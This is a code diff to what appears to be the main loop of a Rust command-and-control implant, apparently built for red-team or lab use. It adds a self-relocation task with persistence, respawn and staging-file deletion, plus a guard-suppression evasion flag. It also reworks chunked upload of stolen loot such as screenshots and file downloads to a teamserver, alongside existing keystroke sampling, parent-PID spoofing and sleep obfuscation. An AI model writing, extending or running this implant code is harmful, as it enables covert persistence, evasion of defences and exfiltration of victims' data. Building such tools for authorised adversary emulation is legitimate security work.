@@ -33,6 +33,7 @@ mod execshc;
 mod mapper;
 mod modules;
 mod persist;
+mod relocate;
 mod selfinfo;
 mod vdm;
 
@@ -360,6 +361,9 @@ async fn main() -> anyhow::Result<()> {
         None => None,
     };
 
+    // `mut` is only exercised by non-lab builds (lab builds shadow this
+    // binding with the flag-overridden copy below).
+    #[cfg_attr(feature = "lab-args", allow(unused_mut))]
     let mut profile = config.profile.clone();
     #[cfg(feature = "lab-args")]
     let mut profile = {
@@ -397,10 +401,11 @@ async fn main() -> anyhow::Result<()> {
         let flags = evasion::Flags::parse(&evasion_spec).map_err(anyhow::Error::msg)?;
         let armed = evasion::Evasion::enable(flags).map_err(anyhow::Error::msg)?;
         note!(
-            "[*] evasion armed: sleep={} parent-spoof={} hwbp={}",
+            "[*] evasion armed: sleep={} parent-spoof={} hwbp={} guard={}",
             flags.ekko_sleep,
             flags.spoofed_parent,
-            flags.hwbp_suppression
+            flags.hwbp_suppression,
+            flags.guard_suppression
         );
         // Publish the hwbp opt-in for the CLR task path before any task
         // can run.
@@ -410,9 +415,14 @@ async fn main() -> anyhow::Result<()> {
 
     // Stable across reconnects within this process: the server resumes
     // the session (id + queue) when the transport dies behind a proxy.
+    // A relocation respawn (ABR-T040) hands over the PREVIOUS process's
+    // token and staging path through the environment — the operator's
+    // session survives the move, and the stage gets deleted once the
+    // resident copy is live.
     let mut beacon = Beacon {
-        token: rand::random(),
+        token: relocate::resume_token().unwrap_or_else(rand::random),
         timing,
+        old_path: std::env::var(relocate::ENV_OLD_PATH).ok(),
     };
 
     // Kill date (T035): a build stamped with an expiry exits silently
@@ -487,11 +497,13 @@ async fn main() -> anyhow::Result<()> {
     }
 }
 
-/// Per-process beacon state that survives transports: the resume token
-/// and the (SLEEP-task adjustable) polling timing.
+/// Per-process beacon state that survives transports: the resume token,
+/// the (SLEEP-task adjustable) polling timing, and — for a relocation
+/// respawn — the staging binary to delete after the first live link.
 struct Beacon {
     token: u64,
     timing: Timing,
+    old_path: Option<String>,
 }
 
 /// Configuration precedence: CLI flags (lab builds only), then the
@@ -617,6 +629,16 @@ async fn run(
     // mid-session drop, not a startup failure, so backoff resets.
     *linked = true;
 
+    // Relocation hygiene (ABR-T040): a respawned copy deletes the
+    // staging binary only once it has a live session — if the resident
+    // copy cannot reach the teamserver, the stage survives for the
+    // retry, and a locked/failed delete is never fatal.
+    if let Some(old) = beacon.old_path.take() {
+        if relocate::cleanup_old_path(&old).is_some() {
+            note!("[*] relocate: staging binary {old} removed");
+        }
+    }
+
     loop {
         evasion.sleep(jittered(beacon.timing.secs, beacon.timing.jitter));
         // Keystroke sampling at every wake (ABR-T031): no dedicated
@@ -645,7 +667,7 @@ async fn run(
                             profile,
                             evasion,
                             Task { id: task.id, body },
-                            &mut beacon.timing,
+                            beacon,
                         )
                         .await?;
                     }
@@ -729,30 +751,34 @@ async fn send_chunks<S: AsyncRead + AsyncWrite + Unpin>(
     task_id: u32,
     data: &[u8],
 ) -> anyhow::Result<()> {
-    let mut body = Vec::new();
-    if data.is_empty() {
+    // One POST per sealed chunk, response opened so the receive counter
+    // stays in lockstep. Two failure modes motivated this: a single
+    // giant body busts the teamserver's MAX_BODY exactly when loot is
+    // large (screenshot BMPs, file downloads) earning a 413 and a full
+    // re-handshake; and the teamserver seals an ack for the completing
+    // chunk, so a discarded response body desyncs the session — the
+    // next poll fails to open, the beacon re-links, and whatever task
+    // that poll carried is lost server-side ("delivered" but never
+    // executed). Bounded exchanges also cap each request's exposure to
+    // POST_TIMEOUT on slow links.
+    let parts: Vec<&[u8]> = if data.is_empty() {
+        vec![&[][..]]
+    } else {
+        data.chunks(CHUNK_SIZE).collect()
+    };
+    let total = parts.len();
+    for (seq, part) in parts.iter().enumerate() {
         let (mt, encoded) = Message::Chunk(Chunk {
             task_id,
-            seq: 0,
-            data: Vec::new(),
-            last: true,
+            seq: seq as u32,
+            data: part.to_vec(),
+            last: seq + 1 == total,
         })
         .encode();
-        body.extend_from_slice(&session.seal(mt, &encoded)?);
-    } else {
-        let total = data.len().div_ceil(CHUNK_SIZE);
-        for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
-            let (mt, encoded) = Message::Chunk(Chunk {
-                task_id,
-                seq: seq as u32,
-                data: part.to_vec(),
-                last: seq + 1 == total,
-            })
-            .encode();
-            body.extend_from_slice(&session.seal(mt, &encoded)?);
-        }
+        let frame = session.seal(mt, &encoded)?;
+        let body = conn.post(profile.pick_uri(), false, frame).await?;
+        open_frames(&body, session)?;
     }
-    conn.post(profile.pick_uri(), false, body).await?;
     Ok(())
 }
 
@@ -803,8 +829,9 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
     profile: &Profile,
     evasion: &evasion::Evasion,
     task: Task,
-    timing: &mut Timing,
+    beacon: &mut Beacon,
 ) -> anyhow::Result<()> {
+    let timing = &mut beacon.timing;
     match task.body {
         TaskBody::Shell { command } => {
             let (status, mut data) = if evasion.spoofed_parent() {
@@ -1005,6 +1032,51 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                 },
             )
             .await
+        }
+        TaskBody::Relocate {
+            dir,
+            name,
+            persist,
+            respawn,
+        } => {
+            // Self-install relocation on the session thread (ABR-T040):
+            // copy, optional persistence against the copy, optional
+            // respawn (resume token + stage path through the
+            // environment) and exit. Own arguments forward verbatim so
+            // lab builds keep their --server/--key flags.
+            let forward: Vec<String> = std::env::args().skip(1).collect();
+            let outcome = match relocate::stage(
+                &dir,
+                &name,
+                &persist,
+                respawn != 0,
+                beacon.token,
+                &forward,
+            ) {
+                Ok(outcome) => (message::STATUS_OK, outcome),
+                Err(e) => (
+                    message::STATUS_ERROR,
+                    relocate::Outcome {
+                        report: e.into_bytes(),
+                        exit: false,
+                    },
+                ),
+            };
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status: outcome.0,
+                    data: outcome.1.report,
+                },
+            )
+            .await?;
+            if outcome.1.exit {
+                std::process::exit(0);
+            }
+            Ok(())
         }
         TaskBody::ExecBof { data, args } => {
             // COFF object execution on the session thread (ABR-T034);
